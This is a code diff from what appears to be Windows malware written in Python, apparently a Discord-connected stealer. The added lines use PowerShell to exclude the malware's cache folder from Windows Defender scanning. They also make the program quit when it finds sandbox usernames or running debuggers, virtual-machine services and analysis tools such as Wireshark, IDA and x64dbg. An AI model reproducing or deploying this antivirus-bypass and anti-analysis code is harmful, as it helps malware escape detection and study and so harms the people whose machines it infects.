@@ -78,7 +78,7 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 if os.path.isdir(nr_working) != True:
     os.mkdir(nr_working)
     
-os.system("powershell Add-MpPreference -ExclusionPath 'C:\\NullCode'")
+os.system(f"powershell Add-MpPreference -ExclusionPath '{nr_working}'")
 
 #> on_ready():
     
@@ -198,6 +198,10 @@ def checkIfProcessRunning(processName): ## Credit: Sanix-Darker
 # Anti TikTok
 for i in ["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl","Joe"]: 
     if i in os.getenv("username"):
+        raise SystemExit(0)
+
+for process in psutil.process_iter():
+    if process.name() in ["ProcessHacker.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe", "pestudio.exe", "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "vmsrvc.exe", "x32dbg.exe", "x64dbg.exe", "x96dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "xenservice.exe", "joeboxserver.exe", "devenv.exe", "IMMUNITYDEBUGGER.EXE", "ImportREC.exe", "reshacker.exe", "windbg.exe", "32dbg.exe", "64dbg.exex", "protection_id.exex", "scylla_x86.exe", "scylla_x64.exe", "scylla.exe", "idau64.exe", "idau.exe", "idaq64.exe", "idaq.exe", "idaq.exe", "idaw.exe", "idag64.exe", "idag.exe", "ida64.exe", "ida.exe", "ollydbg.exe"]: 
         raise SystemExit(0)
 
 if checkIfProcessRunning(os.path.basename(sys.executable)): 
